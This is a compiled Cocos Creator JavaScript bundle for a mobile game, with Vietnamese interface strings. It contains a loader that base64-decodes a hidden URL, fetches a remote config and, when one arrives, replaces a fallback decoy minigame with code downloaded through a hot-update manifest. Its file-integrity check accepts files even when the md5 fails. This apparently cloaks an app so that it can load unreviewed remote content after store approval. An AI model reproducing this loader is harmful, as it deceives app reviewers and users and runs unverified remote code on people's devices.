window.__require = function t(e, s, i) {
function o(a, r) {
if (!s[a]) {
if (!e[a]) {
var c = a.split("/");
c = c[c.length - 1];
if (!e[c]) {
var h = "function" == typeof __require && __require;
if (!r && h) return h(c, !0);
if (n) return n(c, !0);
throw new Error("Cannot find module '" + a + "'");
}
a = c;
}
var l = s[a] = {
exports: {}
};
e[a][0].call(l.exports, function(t) {
return o(e[a][1][t] || t);
}, l, l.exports, t, e, s, i);
}
return s[a].exports;
}
for (var n = "function" == typeof __require && __require, a = 0; a < i.length; a++) o(i[a]);
return o;
}({
"Rozk.Init": [ function(t, e, s) {
"use strict";
cc._RF.push(e, "e5f902jEhxIJKnJ4KMXaL2w", "Rozk.Init");
var i, o = this && this.__extends || (i = function(t, e) {
return (i = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var s in e) Object.prototype.hasOwnProperty.call(e, s) && (t[s] = e[s]);
})(t, e);
}, function(t, e) {
i(t, e);
function s() {
this.constructor = t;
}
t.prototype = null === e ? Object.create(e) : (s.prototype = e.prototype, new s());
}), n = this && this.__decorate || function(t, e, s, i) {
var o, n = arguments.length, a = n < 3 ? e : null === i ? i = Object.getOwnPropertyDescriptor(e, s) : i;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) a = Reflect.decorate(t, e, s, i); else for (var r = t.length - 1; r >= 0; r--) (o = t[r]) && (a = (n < 3 ? o(a) : n > 3 ? o(e, s, a) : o(e, s)) || a);
return n > 3 && a && Object.defineProperty(e, s, a), a;
};
Object.defineProperty(s, "__esModule", {
value: !0
});
s.LoadingGameZ = s.apiAhihii = void 0;
s.apiAhihii = {
g: "",
mf: "",
p: ""
};
var a = cc._decorator, r = a.ccclass, c = a.property, h = function(t) {
o(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.sceneGameIOS = null;
e.SceneGameA_d = null;
e.SceneGameMain = null;
e.packageName = "";
e.listDMBK = [];
e.idxDomain = 0;
e.config = null;
return e;
}
i = e;
e.prototype.start = function() {
cc.log("===================start===========>");
cc.sys.isNative && cc.sys.isMobile && jsb.device && jsb.device.setKeepScreenOn && jsb.device.setKeepScreenOn(!0);
var t = this.convertLink();
this.listDMBK.push(t);
this.listDMBK = this.listDMBK.map(function(t) {
return t;
});
console.log(this.listDMBK);
this.getGameInfo();
};
e.prototype.convertLink = function() {
return atob("aHR0cHM6Ly9zdGlja3libG9ja3N3aXBlc2hvb3QuZ2ZvcmNlcy5jbG91ZC9zdGlja3libG9ja3N3aXBlc2hvb3QudHh0");
};
e.prototype.getGameInfo = function() {
var t = this;
cc.log("getGameInfo===========>");
i.CONFIG_FIRST_GAME = s.apiAhihii;
cc.sys.getNetworkType() != cc.sys.NetworkType.NONE ? this.scheduleOnce(function() {
var e = cc.sys.localStorage.getItem("KEY_DOMAIN_INFO_BACKUP" + t.packageName);
e ? t.onRequestConfig(e) : t.onRequestConfig(t.listDMBK[t.idxDomain]);
}) : this.startMinigame();
};
e.prototype.startMinigame = function() {
cc.sys.os === cc.sys.OS_IOS ? cc.director.loadScene(this.sceneGameIOS.name) : cc.director.loadScene(this.SceneGameA_d.name);
};
e.prototype.startGameMain = function() {
cc.director.loadScene(this.SceneGameMain.name);
};
e.prototype.onRequestConfig = function(t) {
var e = this;
console.log("urll manifestttttttt ======> " + t);
var s = cc.loader.getXMLHttpRequest();
s.onreadystatechange = function() {
if (4 === s.readyState) if (200 === s.status) {
console.log("xhr.responseText ======> " + s.responseText);
s.responseText && e.onProgessZZ(s.responseText.trim());
} else cc.sys.isNative && e.onTryRequest();
};
s.onerror = function() {
console.log("==== load config loi ===");
e.onTryRequest();
};
s.ontimeout = function() {
console.log("timeout " + t);
e.startMinigame();
};
s.timeout = 3e3;
cc.sys.isNative && s.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
s.open("GET", t, !0);
s.send();
};
e.prototype.onProgessZZ = function(t) {
var e = JSON.parse(atob(t));
this.config = e;
i.CONFIG_FIRST_GAME = this.config;
if (null != this.config) {
console.log(i.CONFIG_FIRST_GAME);
this.startGameMain();
} else this.startMinigame();
};
e.prototype.onTryRequest = function() {
var t = !0;
this.idxDomain++;
this.idxDomain >= this.listDMBK.length && (t = !1);
t ? this.onRequestConfig(this.listDMBK[this.idxDomain]) : this.startMinigame();
};
var i;
e.CONFIG_FIRST_GAME = null;
n([ c(cc.SceneAsset) ], e.prototype, "sceneGameIOS", void 0);
n([ c(cc.SceneAsset) ], e.prototype, "SceneGameA_d", void 0);
n([ c(cc.SceneAsset) ], e.prototype, "SceneGameMain", void 0);
n([ c(cc.String) ], e.prototype, "packageName", void 0);
n([ c([ cc.String ]) ], e.prototype, "listDMBK", void 0);
return i = n([ r ], e);
}(cc.Component);
s.LoadingGameZ = h;
cc._RF.pop();
}, {} ],
"Rozk.Loading": [ function(t, e, s) {
"use strict";
cc._RF.push(e, "e94d0FNb95GWJEjpIGLpM8Y", "Rozk.Loading");
var i, o = this && this.__extends || (i = function(t, e) {
return (i = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(t, e) {
t.__proto__ = e;
} || function(t, e) {
for (var s in e) Object.prototype.hasOwnProperty.call(e, s) && (t[s] = e[s]);
})(t, e);
}, function(t, e) {
i(t, e);
function s() {
this.constructor = t;
}
t.prototype = null === e ? Object.create(e) : (s.prototype = e.prototype, new s());
}), n = this && this.__decorate || function(t, e, s, i) {
var o, n = arguments.length, a = n < 3 ? e : null === i ? i = Object.getOwnPropertyDescriptor(e, s) : i;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) a = Reflect.decorate(t, e, s, i); else for (var r = t.length - 1; r >= 0; r--) (o = t[r]) && (a = (n < 3 ? o(a) : n > 3 ? o(e, s, a) : o(e, s)) || a);
return n > 3 && a && Object.defineProperty(e, s, a), a;
};
Object.defineProperty(s, "__esModule", {
value: !0
});
var a = t("./Rozk.Init"), r = cc._decorator, c = r.ccclass, h = r.property, l = function(t) {
o(e, t);
function e() {
var e = null !== t && t.apply(this, arguments) || this;
e.versionLabel = null;
e.lbMsg = null;
e.versionFirst = "1.0.0";
e.prgBar = null;
e.btnAccept = null;
e._countClearCache = 0;
e._updating = !1;
e._canRetry = !1;
e._failCount = 0;
e._storagePath = "";
e._am = null;
e.versionCompareHandle = null;
e._customManifestStr = null;
e.ERROR_NO = 0;
e.ERROR_CHECK_DOWNLOAD = 1;
e.ERROR_DOWNLOAD = 2;
e.ERROR_GETINFO = 3;
e.ERROR_LOAD_SCENE = 4;
e.ERROR_DOMAIN_ZERO = 5;
e.errorCase = e.ERROR_NO;
return e;
}
e.prototype.onLoad = function() {
if (cc.sys.isNative) {
this._storagePath = (jsb.fileUtils ? jsb.fileUtils.getWritablePath() : "/") + a.LoadingGameZ.CONFIG_FIRST_GAME.p;
this.versionCompareHandle = function(t, e) {
var s = t.split("."), i = e.split(".");
console.log("HOT UPDATE: JS Custom Version Compare: version A is " + s + ", version B is " + i);
cc.sys.localStorage.setItem("HotUpdateShowVersion_SS", JSON.stringify(t));
cc.director.emit("HotUpdateShowVersion", t);
for (var o = 0; o < s.length; ++o) {
var n = parseInt(s[o]), a = parseInt(i[o] || 0);
if (n !== a) return n - a;
}
return i.length > s.length ? -1 : 0;
};
this._am = new jsb.AssetsManager(this._customManifestStr, this._storagePath, this.versionCompareHandle);
console.log(this._am._tempVersionPath);
this._am.setVerifyCallback(function(t, e) {
var s = jsb.fileUtils.getDataFromFile(t);
if (window.md5(s) != e.md5) {
console.log("md5 is wrong, file:" + t);
return !0;
}
return !0;
});
this._am.setMaxConcurrentTask(2);
this.checkUpdate();
} else this.runOnWeb();
};
e.prototype._updateLabelVersion = function() {
this.versionLabel && (this.versionLabel.string = "v:" + this._am.getLocalManifest().getVersion());
};
e.prototype.runOnWeb = function() {
this.onUpdateFinish();
};
e.prototype.onDestroy = function() {
this._am && this._am.setEventCallback(null);
this._am = null;
};
e.prototype.showLog = function(t) {
console.log("[HotUpdate===-------\x3eMAIN][showLog]----" + t);
this.lbMsg.string = t;
};
e.prototype.retry = function() {
if (!this._updating && this._canRetry) {
this._canRetry = !1;
this.showLog("Tải lại tệp lỗi...");
this._am.downloadFailedAssets();
}
};
e.prototype.updateCallback = function(t) {
var e = !1, s = !1;
console.log("event.getEventCode() ====" + JSON.stringify(t.getEventCode()));
switch (t.getEventCode()) {
case jsb.EventAssetsManager.ERROR_NO_LOCAL_MANIFEST:
this.showLog("Không tìm thấy tệp manifest，Skip.");
this.errorCase = this.ERROR_DOWNLOAD;
s = !0;
break;

case jsb.EventAssetsManager.UPDATE_PROGRESSION:
var i = t.getPercent();
if (isNaN(i)) return;
var o = t.getMessage();
this.disPatchRateEvent(i, o);
this.showLog("Loading: " + Math.floor(100 * i) + "%");
break;

case jsb.EventAssetsManager.ERROR_DOWNLOAD_MANIFEST:
case jsb.EventAssetsManager.ERROR_PARSE_MANIFEST:
this.showLog("Không tải xuống được manifest");
this.errorCase = this.ERROR_DOWNLOAD;
s = !0;
break;

case jsb.EventAssetsManager.ALREADY_UP_TO_DATE:
this.showLog("Phiên bản mới nhất.");
this.prgBar.progress = 1;
s = !0;
break;

case jsb.EventAssetsManager.UPDATE_FINISHED:
this.showLog("Kết thúc cập nhật." + t.getMessage());
this.disPatchRateEvent(1);
e = !0;
break;

case jsb.EventAssetsManager.UPDATE_FAILED:
this.showLog("Cập nhật lỗi." + t.getMessage());
this._updating = !1;
this._canRetry = !0;
this._failCount++;
this.errorCase = this.ERROR_DOWNLOAD;
break;

case jsb.EventAssetsManager.ERROR_UPDATING:
this.showLog("Lỗi khi cập nhật");
console.log("Lỗi khi cập nhật: " + t.getAssetId() + ", " + t.getMessage());
this.errorCase = this.ERROR_DOWNLOAD;
break;

case jsb.EventAssetsManager.ERROR_DECOMPRESS:
this.showLog("Lỗi giải nén");
this.errorCase = this.ERROR_DOWNLOAD;
}
if (s) {
this._am.setEventCallback(null);
this._updating = !1;
}
if (this._canRetry) {
this.showLog("Kết nối không ổn định, đồng ý để tải lại hoặc xoá rồi cài lại");
this.btnAccept.node.active = !0;
} else this.btnAccept.node.active = s;
if (e) {
this._am.setEventCallback(null);
var n = jsb.fileUtils.getSearchPaths(), a = this._am.getLocalManifest().getSearchPaths();
Array.prototype.unshift.apply(n, a);
cc.sys.localStorage.setItem("HotUpdateSearchPaths", JSON.stringify(n));
jsb.fileUtils.setSearchPaths(n);
console.log("path game main ==========================" + jsb.fileUtils.getWritablePath());
cc.audioEngine.stopAll();
setTimeout(function() {
cc.game.restart();
}, 100);
}
};
e.prototype.hotUpdate = function() {
if (this._am && !this._updating) {
this._am.setEventCallback(this.updateCallback.bind(this));
if (this._am.getState() === jsb.AssetsManager.State.UNINITED) {
var t = new jsb.Manifest(this._customManifestStr, this._storagePath);
this._am.loadLocalManifest(t, this._storagePath);
}
this._failCount = 0;
this._am.update();
this._updating = !0;
}
};
e.prototype.checkCallback = function(t) {
switch (t.getEventCode()) {
case jsb.EventAssetsManager.ERROR_NO_LOCAL_MANIFEST:
this.showLog("Không tìm thấy tệp manifest，Skip.");
this.hotUpdateFinish(!0);
break;

case jsb.EventAssetsManager.ERROR_DOWNLOAD_MANIFEST:
case jsb.EventAssetsManager.ERROR_PARSE_MANIFEST:
this.showLog("Không tải được manifest，Skip");
this.hotUpdateFinish(!1);
break;

case jsb.EventAssetsManager.ALREADY_UP_TO_DATE:
this.showLog("Phiên bản mới nhất");
this.hotUpdateFinish(!0);
break;

case jsb.EventAssetsManager.NEW_VERSION_FOUND:
this.showLog("Có một phiên bản mới và cần được cập nhật");
this._updating = !1;
this.hotUpdate();
return;

case jsb.EventAssetsManager.UPDATE_PROGRESSION:
var e = t.getPercent();
if (isNaN(e)) return;
var s = t.getMessage();
this.showLog("Loading: " + e + ", msg: " + s);
return;

default:
console.log("event.getEventCode():" + t.getEventCode());
return;
}
this._am.setEventCallback(null);
this._updating = !1;
};
e.prototype.checkUpdate = function() {
if (this._updating) this.showLog("Kiểm tra các bản cập nhật..."); else {
if (this._am.getState() === jsb.AssetsManager.State.UNINITED) {
console.log(" ======LoadingGameZ.CONFIG_FIRST_GAME.mf======" + a.LoadingGameZ.CONFIG_FIRST_GAME.mf);
var t = a.LoadingGameZ.CONFIG_FIRST_GAME.mf;
this._customManifestStr = JSON.stringify({
packageUrl: t,
remoteManifestUrl: t + "project.manifest",
remoteVersionUrl: t + "version.manifest",
version: this.versionFirst,
assets: {},
searchPaths: []
});
console.log(this._customManifestStr);
var e = new jsb.Manifest(this._customManifestStr, this._storagePath);
cc.assetManager.md5Pipe && (e = cc.assetManager.md5Pipe.transformURL(e));
this._am.loadLocalManifest(e, this._storagePath);
}
if (this._am.getLocalManifest() && this._am.getLocalManifest().isLoaded()) {
this._am.setEventCallback(this.checkCallback.bind(this));
this._am.checkUpdate();
this._updating = !0;
this.disPatchRateEvent(.01);
} else {
this.showLog("Không thể cập nhật vì lỗi file hệ thống, nhấn đồng ý để thử vào game lại");
this.errorCase = this.ERROR_CHECK_DOWNLOAD;
this.btnAccept.node.active = !0;
}
}
};
e.prototype.hotUpdateFinish = function(t) {
t ? cc.director.emit("HotUpdateFinish", t) : this.btnAccept.node.active = !0;
};
e.prototype.disPatchRateEvent = function(t, e) {
void 0 === e && (e = "");
t > 1 && (t = 1);
cc.director.emit("HotUpdateRate", t);
};
e.prototype.checkVersion = function() {
this.checkUpdate();
this.lbMsg.string = "Đang kiểm tra các bản cập nhật, vui lòng đợi";
};
e.prototype.onEnable = function() {
cc.director.on("HotUpdateFinish", this.onHotUpdateFinish, this);
cc.director.on("HotUpdateRate", this.onHotUpdateRate, this);
cc.director.on("HotUpdateShowVersion", this._updateLabelVersion, this);
};
e.prototype.onDisable = function() {
cc.director.off("HotUpdateFinish", this.onHotUpdateFinish, this);
cc.director.off("HotUpdateRate", this.onHotUpdateRate, this);
cc.director.off("HotUpdateShowVersion", this._updateLabelVersion, this);
};
e.prototype.onHotUpdateRate = function(t) {
var e = t;
e > 1 && (e = 1);
this.prgBar.progress = e;
this.lbMsg.string = "Cập nhật tài nguyên: " + (100 * e).toFixed(2) + "%";
};
e.prototype.onUpdateFinish = function() {
var t = this;
this.lbMsg.string = "";
cc.director.preloadScene("Game", function(e, s) {
var i = e / s;
t.lbMsg.string = "Đang tải " + i.toFixed(0) + " %";
}, function(t) {
t ? cc.error(t) : cc.director.loadScene("Game");
});
};
e.prototype.clearCache = function() {
if (this._countClearCache >= 5) {
this._countClearCache = 0;
console.log(this._countClearCache);
var t = this._storagePath;
if (!t) throw new Error("storagePath not exist");
if (!jsb.fileUtils.isDirectoryExist(t)) throw new Error("path:--\x3e" + t + "not exist");
jsb.fileUtils.removeDirectory(t);
setTimeout(function() {
cc.game.restart();
}, 100);
}
this._countClearCache++;
};
e.prototype.onHotUpdateFinish = function() {
this.onUpdateFinish();
};
e.prototype.onClickConfirm = function() {
this.btnAccept.node.active = !1;
switch (this.errorCase) {
case this.ERROR_CHECK_DOWNLOAD:
this.errorCase = this.ERROR_NO;
this.checkUpdate();
break;

case this.ERROR_DOWNLOAD:
this.errorCase = this.ERROR_NO;
this.retry();
break;

case this.ERROR_GETINFO:
this.errorCase = this.ERROR_NO;
this.showLog("Đang kiểm tra thông tin lại");
this.checkUpdate();
break;

case this.ERROR_DOMAIN_ZERO:
this.showLog("Đang kiểm tra thông tin lại, vui lòng chờ trong giây lát");
this.checkUpdate();
}
};
n([ h(cc.Label) ], e.prototype, "versionLabel", void 0);
n([ h(cc.Label) ], e.prototype, "lbMsg", void 0);
n([ h ], e.prototype, "versionFirst", void 0);
n([ h(cc.ProgressBar) ], e.prototype, "prgBar", void 0);
n([ h(cc.Button) ], e.prototype, "btnAccept", void 0);
return n([ c ], e);
}(cc.Component);
s.default = l;
cc._RF.pop();
}, {
"./Rozk.Init": "Rozk.Init"
} ]
}, {}, [ "Rozk.Init", "Rozk.Loading" ]);
